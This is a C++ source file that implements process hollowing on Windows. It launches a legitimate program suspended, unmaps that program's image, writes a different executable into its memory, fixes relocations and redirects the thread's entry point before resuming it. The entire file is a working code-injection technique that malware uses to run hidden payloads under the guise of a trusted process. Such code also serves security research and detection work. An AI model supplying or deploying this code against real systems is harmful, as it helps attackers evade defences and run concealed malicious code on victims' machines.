// ProcessHollowing.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"
#include "log.h"
void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{

	LOG_PRINTF("Creating process %s", pDestCmdLine);

	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	
	CreateProcessA
	(
		0,
		pDestCmdLine,		
		0, 
		0, 
		0, 
		CREATE_SUSPENDED, 
		0, 
		0, 
		pStartupInfo, 
		pProcessInfo
	);

	if (!pProcessInfo->hProcess)
	{
		LOG_PRINTF("Error creating process");

		return;
	}

	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

	LOG_PRINTF("Opening source image %s", pSourceFile);

	HANDLE hFile = CreateFileA
	(
		pSourceFile,
		GENERIC_READ, 
		0, 
		0, 
		OPEN_ALWAYS, 
		0, 
		0
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		LOG_PRINTF("Error opening %s", pSourceFile);
		return;
	}

	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	LOG_PRINTF("Unmapping destination section");

	HMODULE hNTDLL = GetModuleHandleA("ntdll");

	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD dwResult = NtUnmapViewOfSection
	(
		pProcessInfo->hProcess, 
		pPEB->ImageBaseAddress
	);

	if (dwResult)
	{
		LOG_PRINTF("Error unmapping section");
		return;
	}

	LOG_PRINTF("Allocating memory");

	PVOID pRemoteImage = VirtualAllocEx
	(
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!pRemoteImage)
	{
		LOG_PRINTF("VirtualAllocEx call failed");
		return;
	}

	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
		pSourceHeaders->OptionalHeader.ImageBase;

	LOG_PRINTF
	(
		"Source image base: 0x%p"
		"Destination image base: 0x%p",
		pSourceHeaders->OptionalHeader.ImageBase,
		pPEB->ImageBaseAddress
	);

	LOG_PRINTF("Relocation delta: 0x%p", dwDelta);

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

	LOG_PRINTF("Writing headers");

	if (!WriteProcessMemory
	(
		pProcessInfo->hProcess, 				
		pPEB->ImageBaseAddress, 
		pBuffer, 
		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
		0
	))
	{
		LOG_PRINTF("Error writing process memory");

		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = 
			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		LOG_PRINTF("Writing %s section to 0x%p", pSourceImage->Sections[x].Name, pSectionDestination);

		if (!WriteProcessMemory
		(
			pProcessInfo->hProcess,			
			pSectionDestination,			
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0
		))
		{
			LOG_PRINTF ("Error writing process memory");
			return;
		}
	}	

	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";		

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			LOG_PRINTF("Rebasing image");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = 
				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = 
					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = 
					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = 
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					ReadProcessMemory
					(
						pProcessInfo->hProcess, 
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					//LOG_PRINTF("Relocating 0x%p -> 0x%p", dwBuffer, dwBuffer - dwDelta);

					dwBuffer += dwDelta;

					BOOL bSuccess = WriteProcessMemory
					(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					if (!bSuccess)
					{
						LOG_PRINTF("Error writing memory");
						continue;
					}
				}
			}

			break;
		}


		DWORD dwBreakpoint = 0xCC;

		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
		LOG_PRINTF("Writing breakpoint");

		if (!WriteProcessMemory
			(
			pProcessInfo->hProcess, 
			(PVOID)dwEntrypoint, 
			&dwBreakpoint, 
			4, 
			0
			))
		{
			LOG_PRINTF("Error writing breakpoint");
			return;
		}
#endif

		LPCONTEXT pContext = new CONTEXT();
		pContext->ContextFlags = CONTEXT_INTEGER;

		LOG_PRINTF("Getting thread context");

		if (!GetThreadContext(pProcessInfo->hThread, pContext))
		{
			LOG_PRINTF("Error getting context");
			return;
		}

#ifdef _WIN64
		pContext->Rax = dwEntrypoint;			
#else
		pContext->Eax = dwEntrypoint;	
#endif
		LOG_PRINTF("Setting thread context");

		if (!SetThreadContext(pProcessInfo->hThread, pContext))
		{
			LOG_PRINTF("Error setting context");
			return;
		}

		LOG_PRINTF("Resuming thread");

		if (!ResumeThread(pProcessInfo->hThread))
		{
			LOG_PRINTF("Error resuming thread");
			return;
		}

		LOG_PRINTF("Process hollowing complete");
}
